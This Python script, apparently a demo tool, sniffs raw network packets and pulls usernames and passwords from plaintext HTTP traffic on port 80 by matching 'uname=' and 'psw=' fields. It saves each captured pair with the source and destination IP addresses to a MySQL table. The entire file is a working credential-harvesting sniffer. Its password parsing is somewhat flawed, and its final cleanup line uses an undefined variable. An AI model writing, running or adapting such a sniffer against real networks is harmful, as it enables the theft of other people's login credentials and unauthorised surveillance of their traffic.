import socket
import pymysql
import dbinfo
from networking.ethernet import Ethernet
from networking.ipv4 import IPv4
from networking.tcp import TCP
from networking.http import HTTP

def main():
    conn = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.ntohs(3))
    db_conn = dbinfo.mysqlconnect()
    cursor = db_conn.cursor()
    cursor.execute("DROP TABLE IF EXISTS demo;")
    cursor.execute("CREATE TABLE demo (id int AUTO_INCREMENT, source varchar(30) NOT NULL, dest varchar(30) NOT NULL, user varchar(255) NOT NULL, pass varchar(255) NOT NULL, PRIMARY KEY (id));")
    i = 0

    while True:
        raw_data, addr = conn.recvfrom(65535)
        
        # Unpack Ethernet
        eth = Ethernet(raw_data)

        # Unpack IPv4
        if eth.proto == 8:
            ipv4 = IPv4(eth.data)

            # Unpack TCP
            if ipv4.proto == 6:
                tcp = TCP(ipv4.data)

                # Unpack HTTP
                if len(tcp.data) > 0:
                    if tcp.src_port == 80 or tcp.dest_port == 80:
                        http = HTTP(tcp.data)
                        if len(http.data) < 10:
                            continue
                        i += 1
                        print('PACKET [' + str(i) + ']\n')
                        print('\t\t   ' + 'Source: {}:{}, Target: {}:{}'.format(ipv4.src, tcp.src_port, ipv4.target, tcp.dest_port))
                        print('\t\t   ' + 'HTTP Data:')
                        sub_1 = "uname="
                        sub_2 = "psw="
                        sub_3 = "&"
                        try:
                            username = str(http.data)[(str(http.data).index(sub_1)+len(sub_1)):str(http.data).index(sub_3)]
                        except ValueError:
                            print("\t\t\tNo Credentials Found")
                            continue
                        try:
                            password = str(http.data)[(str(http.data).index(sub_2)+len(sub_2)):str(http.data).index(sub_3)]
                        except ValueError:
                            print("\t\t\tNo Credentials Found")
                        cursor.execute("INSERT INTO demo (source, dest, user, pass) VALUES (%s, %s, %s, %s)", (str(ipv4.src), str(ipv4.target), username, password))
                        db_conn.commit()
                        http_info = str(http.data).split('\n')
                        for line in http_info:
                            print('\t\t\t   ' + str(line))
    cur.close()
    db_conn.close()
main()
